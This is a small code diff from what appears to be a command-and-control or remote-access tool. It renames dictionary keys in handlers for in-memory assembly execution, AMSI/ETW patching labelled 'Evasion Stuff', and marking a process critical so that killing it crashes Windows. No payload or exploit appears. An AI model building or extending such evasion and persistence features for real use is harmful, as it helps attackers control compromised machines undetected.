@@ -252,7 +252,7 @@ def handler_assembly(assembly_path, args, command_dict):
         return False
     assembly_base64 = utils.encode_base_64(assembly_file_content)
     command_dict["as_b64"] = assembly_base64
-    command_dict["args"] = args
+    command_dict["as_args"] = args
     return command_dict
 
 @register_command("patch", "Patch AMSI/ETW", "Evasion Stuff", "Windows", ["<amsi|etw>"])
@@ -304,7 +304,7 @@ def handler_speak(text, command_dict):
 
 @register_command("critical", "Set process critical (BSOD on termination)", "Misc Stuff", "Windows", ["<true/false>"], True)
 def handler_critical(critical_flag, command_dict):
-    command_dict["enable"] = critical_flag.lower() == "true"
+    command_dict["is_critical"] = critical_flag
     return command_dict
 
 @register_command("sleep", "Change sleep time interval and jitter", "Communication Stuff", "All", ["<sleep-time>", "<jitter-%>"])
